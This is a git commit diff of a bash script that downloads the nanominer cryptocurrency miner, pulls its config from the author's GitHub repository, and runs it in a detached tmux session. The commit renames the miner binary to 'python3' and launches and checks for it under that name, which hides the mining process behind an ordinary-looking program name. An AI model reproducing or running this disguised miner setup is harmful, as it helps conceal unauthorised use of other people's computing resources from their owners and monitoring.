14fdc23ddc3ee6f434f8f38ab569a00cdad014c3
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-07-24 19:18:29 +0700

    Update pascal.sh

--- pascal.sh
+++ pascal.sh
@@ -1,24 +1,25 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/nanominer-linux-1.5.0.tar.gz ]; then
-    if pgrep -x "nanominer" > /dev/null
+if [ -f ${PWD}/nanominer-linux-1.5.2.tar.gz ]; then
+    if pgrep -x "python3" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
     
 else
 
 echo "script da install , chay thoi "
-cd nanominer-linux-1.5.0
-tmux new-session -d -s my_session1  './nanominer'
+cd nanominer-linux-1.5.2
+tmux new-session -d -s my_session1  './python3'
      
 fi
 exit
 fi
-sudo apt-get install tmux -y
-wget https://github.com/nanopool/nanominer/releases/download/v1.5.0/nanominer-linux-1.5.0.tar.gz
-tar xvzf nanominer-linux-1.5.0.tar.gz
-cd nanominer-linux-1.5.0
+sudo apt-get install tmux  -y
+wget https://github.com/nanopool/nanominer/releases/download/v1.5.2/nanominer-linux-1.5.2.tar.gz
+tar xvzf nanominer-linux-1.5.2.tar.gz
+cd nanominer-linux-1.5.2
 rm config.ini
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
 chmod +x nanominer
-tmux new-session -d -s my_session1  './nanominer'
+mv nanominer python3 
+tmux new-session -d -s my_session1  './python3'
